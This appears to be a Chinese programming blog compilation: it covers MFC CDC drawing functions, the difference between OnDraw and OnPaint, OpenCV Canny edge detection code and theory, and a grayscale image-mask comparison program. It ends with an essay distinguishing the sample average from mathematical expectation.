void DrawFocusRect(LPCRECT lpRect);参数：lpRect 指向绘制矩形的逻辑坐标的RECT结构或CRect对象。 CDC::FillSolidRect 用指定单颜色填充矩形 void FillSolidRect(LPCRECT lpRect,COLORREF clr);void FillSolidRect(int x,int y,int cx,int cy,COLORREF clr);参数：lpRect指定要填充的矩形；clr填充的颜色x，y矩形的左上角坐标，cx、cy为矩形宽度和高度CDC::FromHandle 在给予一个设备环境句柄时返回一个CDC对象指针 static CDC* PASCAL FromHandle(HDC hDC);参数：hDC 设备环境句柄返回值：CDC对象指针CDC::PaintRgn 用当前画刷填充一个CRgn对象的区域 BOOL PaintRgn(CRgn* pRgn);参数：指向一个CRgn对象的指针返回值：若成功，返回非0；否则返回0CDC::Rectangle 用当前画笔画一个矩形，并用当前画刷填充为实心矩形 BOOL Rectangle(int x1,int y1,int x2,int y2);BOOL Rectangle(LPCRECT lpRect);参数：x1、y1为矩形左上角坐标，x2、y2为矩形右下角坐标lpRect为RECT结构或CRect对象返回值：若成功，返回非0；否则返回0CDC::RestoreDC 将设备环境恢复成先前的状态 virtual BOOL RestoreDC(int nSaveDC);参数：nSaveDC设备环境先前状态的整数标识返回值：若成功，返回非0；否则返回0CDC::RoundRect 用当前画笔画一个圆角矩形，并用当前画刷填充 BOOL RoundRect(int x1,int y1,int x2,int y2,int x3,int y3);BOOL RoundRect(LPCRECT lpRect,POINT point);参数：x1、y1为左上角坐标，x2、y2为右下角坐标，x3、y3为画圆角的椭圆的逻辑宽度和高度lpRect为RECT结构或CRect对象，point中的x、y为画圆角的椭圆的逻辑宽度和高度返回值：若成功，返回非0；否则返回0CDC::SaveDC 保存设备环境的当前状态 virtual int SaveDC();返回值：若成功，返回标识保存设备环境的整数；若错误返回0CDC::SelectStockObject 将一个预定义的库存对象装入设备环境 virtual CGdiObject* SelectStockObject(int nIndex);参数：nIndex库存对象的索引值，常用取值：BLACK_BRUSH 黑色画刷； DKGRAY_BRUSH 深灰色画刷；GRAY_BRUSH 灰色画刷； LTGRAY_BRUSH 浅灰色画刷；WHITE_BRUSH 白色画刷； HOLLOW_BRUSH 中空画刷；NULL_BRUSH 空画刷；BLACK_PEN 黑色画笔； WHITE_PEN 白色画笔；NULL_PEN 空画笔；SYSTEM_FONT 系统字体；返回值：被替换的CGdiObject对象的指针，若调用失败，返回NULL

CDC::SetMapMode设置映射模式，映射模式定义了将逻辑单位转换为设备单位的单位量，并定义了X和Y的方向virtual int SetMapMode(int nMapMode);返回值：上一个映射模式。

 CDC::SelectObject 将一个对象选入设备环境，替代同一类型的先前对象 CPen* SelectObject(CPen* pPen);CBrush* SelectObject(CBrush* pBrush);virtual CFont* SelectObject(CFont* pFont);CBitmap* SelectObject(CBitmap* pBitmap);int SelectObject(CRgn* pRgn);参数：要选入的新对象的指针返回值：先前的旧对象的指针

 CDC::SetBkMode 设置背景模式 int SetBkMode(int nBkMode);参数：nBkMode为要设置的背景模式，取值可以为：OPAQUE 在绘制文本前用当前背景色填充背景，这是缺省的背景模式TRANSPARENT 绘制前不改变背景（即文字背景透明）返回值：先前的背景模式

 CDC::MoveTo 设置画图的起点位置 CPoint MoveTo(int x,int y);CPoint MoveTo(POINT point);参数：x、y为新位置的坐标；point为新位置坐标返回值：先前位置的坐标

 CDC::LineTo 从当前位置到指定点画直线 BOOL LineTo(int x,int y);BOOL LineTo(POINT point);参数：x、y为直线末端的坐标；point为直线末端的坐标返回值：若成功，返回非0；否则返回0该函数通常与MoveTo()函数合起来完成画线工作。 
CDC::SetTextColor 设置文本颜色 virtual COLORREF SetTextColor(COLORREF crColor);参数：crColor指定文本颜色返回值：先前的文本颜色CDC::TextOut 用当前字体在指定位置写一字符串 virtual BOOL TextOut(int x,int y,LPCTSTR lpszString,int nCount);BOOL TextOut(int x,int y,const CString& str);参数：x，y文本左上角坐标；lpszString指示要输出的字符串；nCount为字符串中字节数；str为要输出的CString对象返回值：若成功，返回非0；否则返回0

 CDC::SetBkColor 设置当前背景色 virtual COLORREF SetBkColor(COLORREF crColor);参数：crColor为新背景色返回值：先前背景色；若错误，返回值为0x80000000

 CDC::GetTextExtent 使用当前字体计算一行文本的宽度和高度 CSize GetTextExtent(LPCTSTR lpszString,int nCount)const;CSize GetTextExtent(const CString& str)const;参数：lpszString指向一个字符串，nCount字符串中字符数str 一个字符串对象返回值：字符串文本的宽度和高度（以逻辑单位表示）CDC::GetTextMetrics 检取当前字体的规格 BOOL GetTextMetrics(LPTEXTMETRIC lpMetrics)const;参数：lpMetrics 指向用于接收字体规格的TEXTMETRIC结构返回值：若成功，返回非0；否则返回0

 CDC::DrawText 在指定的矩形内绘制格式化的文本 virtual int DrawText(LPCTSTR lpszString,int nCount,LPRECT lpRect,UINT nFormat);int DrawText(const CString& str,LPRECT lpRect,UINT nFormat);参数：lpszString指示要输出的字符串；nCount为字符串中字节数；lpRect指示文本所在的矩形；str为要输出的CString对象；nFormat为格式化文本的方式，常用取值：DT_BOTTOM 文本底对齐，必须和DT_SINGLELINE联用；DT_CENTER 居中显示文本； DT_LEFT 文本左对齐；DT_RIGHT 文本右对齐； DT_TOP 正文与行顶部对齐（仅指单个行）；DT_NOCLIB 绘制时不加裁减；DT_SINGLELINE 单行显示；DT_VCENTER 指定在垂直方向上居中显示文本（仅只单个行）； DT_WORDBREAK 若单词超过矩形边界，行将在单词间断开返回值：若调用成功，返回文本的高度

 
 
 OnInitialUpdate概括
视图窗口完全建立后第一个被框架调用的函数。框架在第一次调用OnDraw前会调用OnInitialUpdate，因此OnInitialUpdate是设置滚动视图的逻辑尺寸和映射模式的最合适的地方。
时间上，两者先后顺序不同，构造函数生成本类的对象，但没有产生窗口，OnCreate后窗口产生，
然后才是视图的OnInitialUpDate，一般在这里对视图的显示做初始化。简单点,就是OnCreate只是产生VIEW的基本结构和变量而在OnInitialUpDate()中,主要初始化视图中控件等。对各个变量进行初始化操作。
例子。我们要在视图中添加一个button和combobox控件则
2OnCreate函数中写法如下编辑
int CFormView::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
if (CView::OnCreate(lpCreateStruct) == -1)
return -1;
// TODO: Add your specialized creation code here
CRect rect(20,20,100,50);
m_ctrlButton.Create("Button1",WS_CHILD|WS_VISIBLE,rect,this,NULL);
//创建按扭控件
CFont *pFont=CFont::FromHandle((HFONT)::GetStockObject(ANSI_VAR_FONT));
CRect rect1(150,20,350,100);
m_combobox.Create(WS_CHILD|WS_VISIBLE|CBS_SIMPLE|CBS_NOINTEGRALHEIGHT|WS_VSCROLL,rect1,this,NULL);
return 0;
}
3OnInitialUpDate中写法编辑
void CFormView::OnInitialUpdate()
{
CView::OnInitialUpdate();
// TODO: Add your specialized code here and/or call the base class
//初始化组合框控件
m_combobox.AddString("Mondy");
m_combobox.AddString("Tuesday");
m_combobox.AddString("Wednesday");
m_combobox.AddString("Thursday");
m_combobox.AddString("Saturday");
m_combobox.AddString("Sunday");
}
在MFC程序设计中，按照传统的设计，如果处理WM_PAINT消息，一般会派生一个OnPaint函数，映射到WM_PAINT消息上进行绘图处理。但是很多程序中并没有出现OnPaint，一个OnDraw函数做了更多的绘图操作。而在消息映射的列表中，也没有见到WM_PAINT到OnDraw的映射。
实际上，OnDraw不是OnPaint的映射，出现OnDraw，是为了实现各种不同的设备上的绘图一致性。
首先，读者需要明白的是，WM_PAINT消息是为了绘制屏幕而出现的，因此，在OnPaint中，我们只能存取屏幕DC，进行绘制，常见的代码是：
void MyWnd::OnPaint()
{
CPaintDC dc(this);
//draw code here
}
这里的CPaintDC的构造函数会自动调用BeginPaint，获得一个屏幕DC，并附加在dc对象上。当dc对象析构时，系统自动调用EndPaint并使invalidated rectangle变成validated状态，从而结束绘制。(注意，重复创建CPaintDC实例会失败也因为如此)
如果我们在OnPaint中绘制，那么在打印机上绘制我们就需要再写一个OnPrint函数，重新绘制。这样，程序设计者就需要维护两套代码。为了简化操作，MFC框架把大部分绘制操作都放在OnDraw中，OnPaint和OnPrint只构造相应的DC，然后分别调用OnDraw.也就是说，OnDraw适用于所有的设备，而OnPaint只适用于屏幕。
大家在设计过程中必须注意：OnDraw是被基类的OnPaint主动调用的，如果你继承了OnPaint，你应该要么调用基类的OnPaint(此前不得创建CPaintDC实例，也不得调用BeginPaint)，要么自己创建CPaintDC实例，并调用OnDraw.

 
 MFC中OnDraw与OnPaint的区别 ：OnPaint是WM_PAINT消息的消息处理函数，在OnPaint中调用OnDraw，一般来说，用户自己的绘图代码应放在OnDraw中。 OnPaint()是CWnd的类成员，负责响应WM_PAINT消息。OnDraw()是CVIEW的成员函数，没有响应消息的功能.当视图变得无效时（包括大小的改变，移动，被遮盖等等），Windows发送WM_PAINT消息。该视图的OnPaint 处理函数通过创建CPaintDC类的DC对象来响应该消息并调用视图的OnDraw成员函数.OnPaint最后也要调用OnDraw,因此一般在OnDraw函数中进行绘制。The WM_PAINT message is sent when the UpdateWindow or RedrawWindow member function is called. 在OnPaint中，将调用BeginPaint，用来获得客户区的显示设备环境，并以此调用GDI函数执行绘图操作。在绘图操作完成后，将调用EndPaint以释放显示设备环境。而OnDraw在BeginPaint与EndPaint间被调用。 1) 在mfc结构里OnPaint是CWnd的成员函数. OnDraw是CView的成员函数. 2) OnPaint()调用OnDraw()，OnPrint也会调用OnDraw()，所以OnDraw()是显示和打印的共同操作。 OnPaint是WM_PAINT消息引发的重绘消息处理函数，在OnPaint中会调用OnDraw来进行绘图。OnPaint中首先构造一个CPaintDC类得实例，然后一这个实例为参数来调用虚函数OnPrepareDC来进行一些绘制前的一些处理，比设置映射模式，最后调用OnDraw。而OnDraw和OnPrepareDC不是消息处理函数。所以在不是因为重绘消息所引发的OnPaint导致OnDraw被调用时，比如在OnLButtonDown等消息处理函数中绘图时，要先自己调用OnPrepareDC。 至于CPaintDC和CClientDC根本是两回事情 CPaintDC是一个设备环境类，在OnPaint中作为参数传递给OnPrepareDC来作设备环境的设置。真正和CClientDC具有可比性的是CWindowDC，他们一个是描述客户区域，一个是描述整个屏幕。 如果是对CVIEW或从CVIEW类派生的窗口绘图时应该用OnDraw。 OnDraw()和OnPaint()有什么区别呢？ 首先：我们先要明确CView类派生自CWnd类。而OnPaint()是CWnd的类成员，同时负责响应WM_PAINT消息。OnDraw()是CVIEW的成员函数，并且没有响应消息的功能。这就是为什么你用VC成的程序代码时，在视图类只有OnDraw没有OnPaint的原因。而在基于对话框的程序中，只有OnPaint。 其次：我们在第《每天跟我学MFC》3的开始部分已经说到了。要想在屏幕上绘图或显示图形，首先需要建立设备环境DC。其实DC是一个数据结构，它包含输出设备（不单指你17寸的纯屏显示器，还包括打印机之类的输出设备）的绘图属性的描述。MFC提供了CPaintDC类和CWindwoDC类来实时的响应，而CPaintDC支持重画。当视图变得无效时（包括大小的改变，移动，被遮盖等等），Windows 将 WM_PAINT 消息发送给它。该视图的OnPaint 处理函数通过创建 CPaintDC 类的DC对象来响应该消息并调用视图的 OnDraw 成员函数。通常我们不必编写重写的 OnPaint 处理成员函数。 ///CView默认的标准的重画函数 
void CView::OnPaint() //见VIEWCORE.CPP { CPaintDC dc(this); OnPrepareDC(&dc)； OnDraw(&dc); //调用了OnDraw } ///CView默认的标准的OnPrint函数 void CView::OnPrint(CDC* pDC, CPrintInfo*) { ASSERT_VALID(pDC); OnDraw(pDC); // Call Draw } 既然OnPaint最后也要调用OnDraw,因此我们一般会在OnDraw函数中进行绘制。下面是一个典型的程序。 ///视图中的绘图代码首先检索指向文档的指针，然后通过DC进行绘图调用。 void CMyView::OnDraw( CDC* pDC ) { CMyDoc* pDoc = GetDocument(); CString s = pDoc->GetData(); GetClientRect( &rect ); // Returns a CString CRect rect; pDC->SetTextAlign( TA_BASELINE | TA_CENTER ); pDC->TextOut( rect.right / 2, rect.bottom / 2, s, s.GetLength() ); } 最后：现在大家明白这哥俩之间的关系了吧。因此我们一般用OnPaint维护窗口的客户区（例如我们的窗口客户区加一个背景图片），用OnDraw维护视图的客户区（例如我们通过鼠标在视图中画图）。当然你也可以不按照上面规律来，只要达到目的并且没有问题，怎么干都成。补充：我们还可以利用Invalidate(),ValidateRgn(),ValidateRect()函数强制的重画窗口，具体的请参考MSDN吧。 OnDraw中可以绘制用户区域。OnPaint中只是当窗口无效时重绘不会保留CClientDC绘制的内容。 这两个函数有区别也有联系： 1、区别：OnDraw是一个纯虚函数，定义为virtual void OnDraw( CDC* pDC ) = 0;　而OnPaint是一个消息响应函数，它响应了WM＿PANIT消息，也是是窗口重绘消息。 2、联系：我们一般在视类中作图的时候，往往不直接响应WM＿PANIT消息，而是重载OnDraw纯虚函数，这是因为在CVIEW类中的WM＿PANIT消息响应函数中调用了OnDraw函数，如果在CMYVIEW类中响应了WM＿PAINT消息，不显式地调用OnDraw函数的话，是不会在窗口重绘的时候调用OnDraw函数的。 应用程序中几乎所有的绘图都在视图的 OnDraw 成员函数中发生，必须在视图类中重写该成员函数。（鼠标绘图是个特例，这在通过视图解释用户输入中讨论。） OnDraw 重写： 通过调用您提供的文档成员函数获取数据。 通过调用框架传递给 OnDraw 的设备上下文对象的成员函数来显示数据。 当文档的数据以某种方式更改后，必须重绘视图以反映该更改。默认的 OnUpdate 实现使视图的整个工作区无效。当视图变得无效时，Windows 将 WM_PAINT 消息发送给它。该视图的 OnPaint 处理函数通过创建 CPaintDC 类的设备上下文对象来响应该消息并调用视图的 OnDraw 成员函数。 当没有添加WM_PAINT消息处理时,窗口重绘时,由OnDraw来进行消息响应...当添加WM_PAINT消息处理时,窗口重绘时,WM_PAINT消息被投递,由OnPaint来进行消息响应.这时就不能隐式调用OnDraw了.必须显式调用( CDC *pDC=GetDC(); OnDraw(pDC); ).. 隐式调用:当由OnPaint来进行消息响应时,系统自动调用CView::OnDraw(&pDC). 想象一下，窗口显示的内容和打印的内容是差不多的，所以，一般情况下，统一由OnDraw来画。窗口前景需要刷新时，系统会会调用到OnPaint，而OnPaint一般情况下是对DC作一些初始化操作后，调用OnDraw()。 OnEraseBkGnd()，是窗口背景需要刷新时由系统调用的。明显的一个例子是设置窗口的背景颜色（你可以把这放在OnPaint中去做，但是会使产生闪烁的现象）。 至于怎么界定背景和前景，那要具体问题具体分析了，一般情况下，你还是很容易区别的吧。 的确，OnPaint()用来响应WM_PAINT消息，视类的OnPaint()内部根据是打印还是屏幕绘制分别以不同的参数调用OnDraw()虚函数。所以在OnDraw()里你可以区别对待打印和屏幕绘制。 其实，MFC在进行打印前后还做了很多工作，调用了很多虚函数，比如OnPreparePrint()等。 

  





图像边缘检测--OpenCV之cvCanny函数
分类： C/C++
void cvCanny( const CvArr* image, CvArr* edges, double threshold1, double threshold2, int aperture_size=3 ); image单通道输入图像.edges单通道存储边缘的输出图像threshold1第一个阈值threshold2第二个阈值aperture_sizeSobel 算子内核大小 (见 cvSobel).
函数 cvCanny 采用 CANNY 算法发现输入图像的边缘而且在输出图像中标识这些边缘。threshold1和threshold2 当中的小阈值用来控制边缘连接，大的阈值用来控制强边缘的初始分割。
注意事项：cvCanny只接受单通道图像作为输入。 外部链接：经典的canny自调整阈值算法的一个opencv的实现见在OpenCV中自适应确定canny算法的分割门限参考OpenCV中文官网：http://www.opencv.org.cn/index.php/Cv%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86#Canny说明：OpenCV中cvCanny函数用到了cvSobel的差分计算。下图为OpenCV的cvCanny函数效果

点击(此处)折叠或打开
#include "stdafx.h" 
#include <cv.h> 
#include <cxcore.h> 
#include <highgui.h> 
#include <cmath> 
using namespace std; 
using namespace cv; 
int main(int argc ,char ** argv) 
{ 
IplImage * pImg=NULL; 
    IplImage * pCannyImg=NULL; 
if (argc ==2&&(pImg=cvLoadImage(argv[1],0))!=0) 
{ 
        pCannyImg=cvCreateImage(cvGetSize(pImg),IPL_DEPTH_8U,1); 
        cvCanny(pImg,pCannyImg,50,150,3); 
//创建窗口 
        cvNamedWindow("src", 1); 
        cvNamedWindow("canny",1); 
//显示图像 
        cvShowImage( "src", pImg ); 
        cvShowImage( "canny", pCannyImg ); 
        cvWaitKey(0); //等待按键 
//销毁窗口 
        cvDestroyWindow( "src" ); 
        cvDestroyWindow( "canny" ); 
//释放图像 
        cvReleaseImage( &pImg ); 
        cvReleaseImage( &pCannyImg ); 
        return 0; 
} 
    return -1; 
}
重要：Canny原理：链接及内容：http://blog.csdn.net/likezhaobin/article/details/6892176
 
opencv2版本：
// canny边缘检测.cpp : 定义控制台应用程序的入口点。 
//
#include "stdafx.h"

#include "stdafx.h" 
#include <cv.h> 
#include <cxcore.h> 
#include <highgui.h> 
#include <cmath>
#include <opencv2/imgproc/imgproc.hpp>  
#include <opencv2/highgui/highgui.hpp>  
#include <iostream>  
  
#pragma comment(lib,"opencv_core2410d.lib")            
#pragma comment(lib,"opencv_highgui2410d.lib")            
#pragma comment(lib,"opencv_imgproc2410d.lib") 
using namespace std; 
using namespace cv;
int main(int argc ,char ** argv) 
{ 
    IplImage * pImg=NULL; 
    IplImage * pCannyImg=NULL;

    cv::Mat src = cv::imread("swan.jpg");  
    if (src.empty())  
        return -1;  
      
    cv::Mat bw;  
    cv::cvtColor(src, bw, CV_BGR2GRAY);  
    Mat canny_mat(src.size(),CV_8U); 
    
        //cvCanny(pImg,pCannyImg,50,150,3); 
        cv::Canny(bw,canny_mat,50,150,3); 
    
        imshow("canny",canny_mat);
        cvWaitKey(0); //等待按键

        return 0; 
    
}

 
边缘检测后：

 
图象的边缘是指图象局部区域亮度变化显著的部分，该区域的灰度剖面一般可以看作是一个阶跃，既从一个灰度值在很小的缓冲区域内急剧变化到另一个灰度相差较大的灰度值。图象的边缘部分集中了图象的大部分信息，图象边缘的确定与提取对于整个图象场景的识别与理解是非常重要的，同时也是图象分割所依赖的重要特征，边缘检测主要是图象的灰度变化的度量、检测和定位，自从1959提出边缘检测以来，经过五十多年的发展，已有许多中不同的边缘检测方法。根据作者的理解和实践，本文对边缘检测的原理进行了描述，在此基础上着重对Canny检测算法的实现进行详述。
        本文所述内容均由编程验证而来，在实现过程中，有任何错误或者不足之处大家共同讨论（本文不讲述枯燥的理论证明和数学推导，仅仅从算法的实现以及改进上进行原理性和工程化的描述）。
1、边缘检测原理及步骤
        在之前的博文中，作者从一维函数的跃变检测开始，循序渐进的对二维图像边缘检测的基本原理进行了通俗化的描述。结论是：实现图像的边缘检测，就是要用离散化梯度逼近函数根据二维灰度矩阵梯度向量来寻找图像灰度矩阵的灰度跃变位置，然后在图像中将这些位置的点连起来就构成了所谓的图像边缘（图像边缘在这里是一个统称，包括了二维图像上的边缘、角点、纹理等基元图）。
        在实际情况中理想的灰度阶跃及其线条边缘图像是很少见到的，同时大多数的传感器件具有低频滤波特性，这样会使得阶跃边缘变为斜坡性边缘，看起来其中的强度变化不是瞬间的，而是跨越了一定的距离。这就使得在边缘检测中首先要进行的工作是滤波。
        1）滤波：边缘检测的算法主要是基于图像强度的一阶和二阶导数，但导数通常对噪声很敏感，因此必须采用滤波器来改善与噪声有关的边缘检测器的性能。常见的滤波方法主要有高斯滤波，即采用离散化的高斯函数产生一组归一化的高斯核（具体见“高斯滤波原理及其编程离散化实现方法”一文），然后基于高斯核函数对图像灰度矩阵的每一点进行加权求和（具体程序实现见下文）。
        2）增强：增强边缘的基础是确定图像各点邻域强度的变化值。增强算法可以将图像灰度点邻域强度值有显著变化的点凸显出来。在具体编程实现时，可通过计算梯度幅值来确定。
        3）检测：经过增强的图像，往往邻域中有很多点的梯度值比较大，而在特定的应用中，这些点并不是我们要找的边缘点，所以应该采用某种方法来对这些点进行取舍。实际工程中，常用的方法是通过阈值化方法来检测。
2、Canny边缘检测算法原理
        JohnCanny于1986年提出Canny算子，它与Marr（LoG）边缘检测方法类似，也属于是先平滑后求导数的方法。本节对根据上述的边缘检测过程对Canny检测算法的原理进行介绍。
2.1 对原始图像进行灰度化
        Canny算法通常处理的图像为灰度图，因此如果摄像机获取的是彩色图像，那首先就得进行灰度化。对一幅彩色图进行灰度化，就是根据图像各个通道的采样值进行加权平均。以RGB格式的彩图为例，通常灰度化采用的方法主要有：
        方法1：Gray=(R+G+B)/3;
        方法2：Gray=0.299R+0.587G+0.114B;（这种参数考虑到了人眼的生理特点）
        注意1：至于其他格式的彩色图像，可以根据相应的转换关系转为RGB然后再进行灰度化；
        注意2：在编程时要注意图像格式中RGB的顺序通常为BGR。
2.2 对图像进行高斯滤波
        图像高斯滤波的实现可以用两个一维高斯核分别两次加权实现，也可以通过一个二维高斯核一次卷积实现。
        1）高斯核实现

上式为离散化的一维高斯函数，确定参数就可以得到一维核向量。

        上式为离散化的二维高斯函数，确定参数就可以得到二维核向量。
        注意1：关于参数Sigma的取值详见上篇博文。
        注意2：在求的高斯核后，要对整个核进行归一化处理。
2）图像高斯滤波
        对图像进行高斯滤波，听起来很玄乎，其实就是根据待滤波的像素点及其邻域点的灰度值按照一定的参数规则进行加权平均。这样可以有效滤去理想图像中叠加的高频噪声。
        通常滤波和边缘检测是矛盾的概念，抑制了噪声会使得图像边缘模糊，这回增加边缘定位的不确定性；而如果要提高边缘检测的灵敏度，同时对噪声也提高了灵敏度。实际工程经验表明，高斯函数确定的核可以在抗噪声干扰和边缘检测精确定位之间提供较好的折衷方案。这就是所谓的高斯图像滤波，具体实现代码见下文。
2.3 用一阶偏导的有限差分来计算梯度的幅值和方向
        关于图像灰度值得梯度可使用一阶有限差分来进行近似，这样就可以得图像在x和y方向上偏导数的两个矩阵。常用的梯度算子有如下几种：
        1）Roberts算子

        上式为其x和y方向偏导数计算模板，可用数学公式表达其每个点的梯度幅值为：

        2）Sobel算子

        上式三个矩阵分别为该算子的x向卷积模板、y向卷积模板以及待处理点的邻域点标记矩阵，据此可用数学公式表达其每个点的梯度幅值为：

        3）Prewitt算子
        和Sobel算子原理一样，在此仅给出其卷积模板。

        4）Canny算法所采用的方法
        在本文实现的Canny算法中所采用的卷积算子比较简单，表达如下：

        其x向、y向的一阶偏导数矩阵，梯度幅值以及梯度方向的数学表达式为：

        求出这几个矩阵后，就可以进行下一步的检测过程。
2.4 对梯度幅值进行非极大值抑制        图像梯度幅值矩阵中的元素值越大，说明图像中该点的梯度值越大，但这不不能说明该点就是边缘（这仅仅是属于图像增强的过程）。在Canny算法中，非极大值抑制是进行边缘检测的重要步骤，通俗意义上是指寻找像素点局部最大值，将非极大值点所对应的灰度值置为0，这样可以剔除掉一大部分非边缘的点（这是本人的理解）。

图1 非极大值抑制原理
        根据图1 可知，要进行非极大值抑制，就首先要确定像素点C的灰度值在其8值邻域内是否为最大。图1中蓝色的线条方向为C点的梯度方向，这样就可以确定其局部的最大值肯定分布在这条线上，也即出了C点外，梯度方向的交点dTmp1和dTmp2这两个点的值也可能会是局部最大值。因此，判断C点灰度与这两个点灰度大小即可判断C点是否为其邻域内的局部最大灰度点。如果经过判断，C点灰度值小于这两个点中的任一个，那就说明C点不是局部极大值，那么则可以排除C点为边缘。这就是非极大值抑制的工作原理。
        作者认为，在理解的过程中需要注意以下两点：
        1）中非最大抑制是回答这样一个问题：“当前的梯度值在梯度方向上是一个局部最大值吗？” 所以,要把当前位置的梯度值与梯度方向上两侧的梯度值进行比较；
        2）梯度方向垂直于边缘方向。
        但实际上，我们只能得到C点邻域的8个点的值，而dTmp1和dTmp2并不在其中，要得到这两个值就需要对该两个点两端的已知灰度进行线性插值，也即根据图1中的g1和g2对dTmp1进行插值，根据g3和g4对dTmp2进行插值，这要用到其梯度方向，这是上文Canny算法中要求解梯度方向矩阵Thita的原因。
        完成非极大值抑制后，会得到一个二值图像，非边缘的点灰度值均为0，可能为边缘的局部灰度极大值点可设置其灰度为128。根据下文的具体测试图像可以看出，这样一个检测结果还是包含了很多由噪声及其他原因造成的假边缘。因此还需要进一步的处理。
2.5 用双阈值算法检测和连接边缘
        Canny算法中减少假边缘数量的方法是采用双阈值法。选择两个阈值（关于阈值的选取方法在扩展中进行讨论），根据高阈值得到一个边缘图像，这样一个图像含有很少的假边缘，但是由于阈值较高，产生的图像边缘可能不闭合，未解决这样一个问题采用了另外一个低阈值。
        在高阈值图像中把边缘链接成轮廓，当到达轮廓的端点时，该算法会在断点的8邻域点中寻找满足低阈值的点，再根据此点收集新的边缘，直到整个图像边缘闭合。






图片对比，计算不同像素个数，已经比率。实现人工分割跟算法分割图像结果的对比，但是只能用灰度图像作为输入
 
// imageMaskComparison.cpp : 定义控制台应用程序的入口点。
//

// imageMaskComparison.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include <opencv2/core/core.hpp>
#include <opencv2/highgui/highgui.hpp>
#include <iostream>
using namespace std;
using namespace cv;

int main()
{


	String image_name,image1,image2;
	cout<<"input Parameters:"<<endl;

	cout<<"image name 1 : ";
	cin>>image1;
	cout<<"image name 2 : ";
	cin>>image2;


	Mat img1 = imread((char *)image1.c_str(), CV_LOAD_IMAGE_GRAYSCALE);
	Mat img2 = imread((char *)image2.c_str(), CV_LOAD_IMAGE_GRAYSCALE);//两幅图像的大小需要一致 
	imshow("img1",img1);
	imshow("img2",img2);

	Mat img_result1 , img_result2 , img_result ;

	img_result1.create(img1.rows,img1.cols,CV_8UC1);
	img_result1 = 255;

	img_result2.create(2,img1.size,CV_8UC1);
	img_result2 = 255;

	img_result.create(img2.rows,img2.cols,CV_8UC1);
	img_result = 0;

	//subtract(img1,img2, img_result1);
	//subtract(img2,img1, img_result2);
	//add(img_result1, img_result2, img_result1);

	absdiff(img1,img2,img_result);

	int init_index = 0;

	
	/*
	for(int i=0; i<img_result.rows; i++)
	{
		for(int j=0; j<img_result.cols; j++) 
		{
			if (img_result.at<uchar>(i,j)== 255)
			{
				init_index++;
			}
			
			
			
		}
	}
	



	*/
	

	int count = 0;
	

	for(int i=0; i<img1.rows; i++)
	{
		
		
		for(int j=0; j<img1.cols; j++) 
		{
			
			
			if ( img1.at<uchar>(i,j) == img2.at<uchar>(i,j))
			{
				
				img_result.at<uchar>(i,j) = (uchar)255;
			}
			else
			{
				count++;
				img_result.at<uchar>(i,j) = (uchar)0;
			}

		}
	}
	

	int sum = img1.cols*img1.rows;
	double error_ratio = count/(double)sum;
	
	//cout<<init_index<<endl;
	cout<<"number of different pixel:"<<count<<endl;
	cout<<"error ratio: "<<error_ratio<<endl;
	imwrite("result.bmp",img_result);

	//imshow("result1", img_result1);
	//imshow("result2", img_result2);
	 namedWindow( "result", CV_WINDOW_AUTOSIZE );
	imshow("result", img_result);
	waitKey();
	return 0;
}

 
 

 









作者： 一人

文章大纲众多原因造成平均值与期望的混淆学习与应用过程当中对于二者“不加区分”二者联系十分紧密语言文化的影响区分平均值和期望明确平均值的研究范畴-数理统计明确期望的研究范畴-概率论大数定理的应用与局限学习建议

前些日子偶然间听到一位新同事问一位做算法的同事：均值是不是期望？老算法回答说：这是不同的概念。说完之后，由于有事就急匆匆的走了。偶听到之后狐疑了一会，打开了搜索引擎。当然，答案是非常明晰且简单的，均值严格来说就是期望。然而在查阅网上相关讨论时发现很多人对它们是分不清的。后来思来想去，为什么造成如此大的误解？直至近日有了答案。
由于语言等方面的原因，通常人们口中说到均值的时候，是在谈论平均值。因此，以上的混乱事实上是对平均值和期望的混乱。而平均值属于《数理统计》的范畴，期望属于《概率论》的范畴，因此，这种混淆更深层次的反映出人们对这两门学科理解的混乱。
众多原因造成平均值与期望的混淆
通过查阅相关资料，发现混淆平均值和期望的现象并不是个例1，因此有理由怀疑这种现象的存在有着本质的原因，经过多方分析，我发现造成人们混淆两者关系的原因是多个方面的：

学习与应用过程当中对于二者“不加区分”
二者都是总体趋势的一种度量
语言文化的影响

学习与应用过程当中对于二者“不加区分”

内容安排与课程设置上没有进行隔离

在学习相关知识的时候教材通常是《概率论与数理统计》，由于概率论与数理统计联系十分紧密，出版社将这两门学科安排在了同一本书中。对于懵懂的大一新生来说，都是一本书、一堂课、一个教学老师，对于习惯了以前不同科目不同老师的划分方式，这样的内容安排以及教学安排是很难接受的。学生在思维上没有及时转变过来，因此，混淆这两者的关系就是情理之中了。

缺少实践机会无法对知识进行修正

我们说实践是检验真理的唯一标准，如果学习到错误的知识，那么在应用过程中就会出错，进而人们对于以前的概念进行修正，最终吸收的知识就一定是正确的。如果缺乏这种应用，那么就失去了发现错误概念并修正的机会。而且，应用实践相比学习难度大了不止一个量级，很多人往往也仅仅是做到了“学”，而放弃了”习“的过程。在《概率论与数理统计》这门课的学习过程中，在教学过程当中缺乏对于这两门知识的实践应用，安排的只是一些纯理论的计算，没有实验验证环节。因此，混淆知识就是十分普遍的了。
二者联系十分紧密

二者都是总体趋势的一种度量

平均值2和中位数、众数、中点距被一起用来描述一组样本的中心趋势，是样本集合的一种中心化趋势的描述。期望的描述引述陈希孺院士《概率论与数理统计》3如下：

数学期望常称为“均值”，即“随机变量取值的平均值”之意，当然这个平均，是指以概率为权的加权平均。……数学期望是由随机变量的分布完全决定。

以上表明数学期望是随机变量的一种中心化趋势的描述。如果认为平均值和期望相同，大脑只需对一个点进行记忆；如果不同，就需要对两个点进行记忆，更何况是随机变量这种十分抽象的概念。因此，忽视前面的修饰（样本集合、随机变量）就是十分普遍的事情了。

大数定理将二者连接起来

大数定理45说明当样本量N趋近无穷大的时候，样本的平均值无限接近数学期望。

In probability theory, the law of large numbers (LLN) is a theorem that describes the result of performing the same experiment a large number of times. According to the law, the average of the results obtained from a large number of trials should be close to the expected value, and will tend to become closer as more trials are performed.

这里有一个限定条件“样本量趋近无穷大”，往往人们容易遗忘的就是这个限定条件。如果样本较小的时候，使用平均值来代替期望就要计算它可信程度了（置信水平）。
语言文化的影响
前面引文说过，数学期望又叫均值；而我们的平均值和均值只是一字之差，少一个字就是相同的。而在英语中平均值写作average,均值写作mean，这两个字体上就差别比较大。
